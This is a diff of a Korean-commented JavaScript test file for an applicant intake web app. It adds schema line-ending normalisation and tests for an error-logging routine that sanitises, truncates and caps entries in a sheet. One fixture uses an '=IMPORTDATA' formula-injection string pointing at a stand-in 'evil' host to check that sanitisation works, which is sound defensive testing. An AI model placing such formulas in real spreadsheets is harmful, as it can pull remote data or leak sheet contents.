@@ -80,11 +80,14 @@ test('🔑 2행에 **박힌** 스키마 = 정본 JSON — 런타임이 읽는 �
    *   window.__resources.fieldSchema 가 먼저 이긴다. 그래서 정본을 고쳐도 라이브는 안 바뀐다.
    * 🔑 이건 「문서가 코드와 다르다」가 아니라 **「정본이라 부르는 파일이 실행에 안 쓰인다」**다.
    *   증상이 0이라 눈으로는 영원히 안 걸린다. 굽는 도구 = tools/크루카드_스키마굽기.js */
-  const 정본 = read('docs/크루카드/크루카드_스키마.json');
+  // LF 정규화 양쪽 — autocrlf=true 체크아웃은 정본을 CRLF로 내려주는데 base64 속 사본은 LF 그대로라,
+  // 내용이 같아도 줄끝만으로 적색이 된다(재는 층이 값을 깨뜨리는 계열 · 굽기 도구도 같은 정규화를 한다)
+  const LF = (s) => s.replace(/\r\n/g, '\n');
+  const 정본 = LF(read('docs/크루카드/크루카드_스키마.json'));
   for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
     const m = /"fieldSchema":\s*"data:application\/json;base64,([A-Za-z0-9+/=]+)"/.exec(html);
     assert.ok(m, `[${name}] 2행 base64 스키마 앵커가 사라졌다`);
-    assert.equal(Buffer.from(m[1], 'base64').toString('utf8'), 정본,
+    assert.equal(LF(Buffer.from(m[1], 'base64').toString('utf8')), 정본,
       `[${name}] 박힌 스키마가 정본과 다르다 — \`node tools/크루카드_스키마굽기.js\` 로 굽고 커밋하라`);
   }
 });
@@ -148,6 +151,84 @@ test('서버 보안 불변식 — doGet 무부작용·hp 선차단·일일상한
   }
   assert.ok(doPost.includes("error: 'internal'"), '내부 오류를 밖으로 흘리지 않는 응답이 사라졌다');
   assert.ok(server.includes('MAX_CELL'), '셀 길이 상한 소실');
+});
+
+/* ═══════════════════════════════════════════════════════════════════
+ * doPost 오류 감시 [2026-08-05] — 조용한 실패 = 지원자 유실
+ *   웹앱 오류는 트리거 실패 자동 메일 층 밖이라 호출자에게 'internal'로만 돌아갔다.
+ *   처방 = 시트(crew_errors)에 적고, 알림은 감시되는 층(메인 crewIntakeWatch_)이 낸다.
+ *   메일 금지(익명 POST=메일 폭탄)는 위의 기존 회귀가 파일 전체를 계속 잠근다.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+test('doPost가 삼키는 두 실패(최상위·이관) 모두 crew_errors 기록을 지난다', () => {
+  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
+  // 최상위 catch — 기록이 응답보다 먼저다(응답 뒤 코드는 실행되지 않는 죽은 배선이 된다)
+  assert.match(doPost, /catch \(err\) \{[\s\S]*크루_오류로그_\('doPost', err\)[\s\S]*error: 'internal'/,
+    '최상위 catch가 기록 없이(또는 응답 뒤에) 오류를 삼킨다 — 무감시로 회귀');
+  // 이관 catch — 유실 경보는 「없어졌다」만 알지 「왜」를 모른다. 원인은 여기서만 잡힌다.
+  assert.ok(doPost.includes("크루_오류로그_('이관:' + serial, e2)"),
+    '이관 실패가 기록을 안 지난다 — 유실 경보에 원인이 영영 안 붙는다');
+});
+
+function 오류로그하네스_(over) {
+  const 저장 = { rows: [], props: {}, sh: null, 생성: 0 };
+  const fakeSheet = () => ({
+    getRange: () => ({ setValues() { return this; }, setFontWeight() { return this; } }),
+    setFrozenRows: () => {},
+    appendRow: (r) => 저장.rows.push(r),
+  });
+  const SS = (over && over.SpreadsheetApp) || {
+    openById: () => ({
+      getSheetByName: () => 저장.sh,
+      insertSheet: () => { 저장.생성++; 저장.sh = fakeSheet(); return 저장.sh; },
+    }),
+  };
+  const src = server.match(/function 크루_오류로그_\(stage, err\)[\s\S]*?\n\}/)[0];
+  const 셀안전src = server.match(/function 셀안전_\(v\)[\s\S]*?\n\}/)[0];
+  const fn = new Function(
+    'PropertiesService', 'SpreadsheetApp', 'Utilities', 'console', 'TZ_', 'CONSULT_SHEET_ID', 'ERR_TAB', 'ERR_DAILY_CAP',
+    src + '\n' + 셀안전src + '\nreturn 크루_오류로그_;'
+  )(
+    { getScriptProperties: () => ({ getProperty: (k) => 저장.props[k], setProperty: (k, v) => { 저장.props[k] = v; } }) },
+    SS,
+    { formatDate: () => '20260805' },
+    { error: () => {}, warn: () => {} },
+    'Asia/Ulaanbaatar', 'FAKE', 'crew_errors', 50
+  );
+  return { fn, 저장 };
+}
+
+test('크루_오류로그_ — 실제로 적는다: 탭 생성·개행 접기·수식 소독·길이 절단', () => {
+  const { fn, 저장 } = 오류로그하네스_();
+  fn('doPost', { stack: '=IMPORTDATA("https://evil")\n  at 크루_탭_ (크루카드:1)\t끝' });
+  assert.equal(저장.생성, 1, '탭이 없으면 만들어야 한다 — 첫 오류가 기록처를 못 찾으면 안 된다');
+  assert.equal(저장.rows.length, 1);
+  const [, stage, detail, 통보] = 저장.rows[0];
+  assert.equal(stage, 'doPost');
+  assert.equal(통보, '', '통보 칸은 비워 둬야 감시가 「새 사건」으로 읽는다');
+  assert.ok(detail.startsWith("'="), '오류 문자열의 수식 접두가 소독을 안 지났다 — 오류 기록이 인젝션 통로가 된다');
+  assert.ok(!/[\r\n\t]/.test(detail), '개행·탭이 살아 있다 — 경보 메일 본문 위조 재료가 된다');
+  fn('x', { stack: 'A'.repeat(9999) });
+  assert.ok(저장.rows[1][2].length <= 500, `detail이 ${저장.rows[1][2].length}자 — 상한 없이 시트가 오염된다`);
+});
+
+test('크루_오류로그_ — 일일 상한: 오류 유발 반복 제출이 시트를 무한 증식시키지 못한다', () => {
+  const { fn, 저장 } = 오류로그하네스_();
+  저장.props['errlog:20260805'] = '50';
+  fn('doPost', new Error('x'));
+  assert.equal(저장.rows.length, 0, '상한을 넘겼는데 계속 적는다');
+  // 상한 소모는 기록이 성립한 뒤에만 — 기록 실패가 상한만 태우면 진짜 오류가 밀려난다
+  const 깨짐 = 오류로그하네스_({ SpreadsheetApp: { openById: () => { throw new Error('시트 다운'); } } });
+  깨짐.fn('doPost', new Error('x'));
+  assert.equal(깨짐.저장.props['errlog:20260805'], undefined, '기록이 실패했는데 상한을 소모했다');
+});
+
+test('🔒 크루_오류로그_는 절대 throw 하지 않는다 — 기록하려다 접수 응답까지 죽이면 역전이다', () => {
+  const 깨짐 = 오류로그하네스_({ SpreadsheetApp: { openById: () => { throw new Error('시트 다운'); } } });
+  assert.doesNotThrow(() => 깨짐.fn('doPost', new Error('원 오류')));
+  const 널 = 오류로그하네스_();
+  assert.doesNotThrow(() => 널.fn('이관:SL-1', undefined), 'err가 undefined여도 죽으면 안 된다');
+  assert.equal(널.저장.rows.length, 1, 'undefined 오류도 기록 자체는 남아야 한다');
 });
 
 test('수식 인젝션 차단 — 셀안전_가 정본과 같고 실제로 막는다', () => {
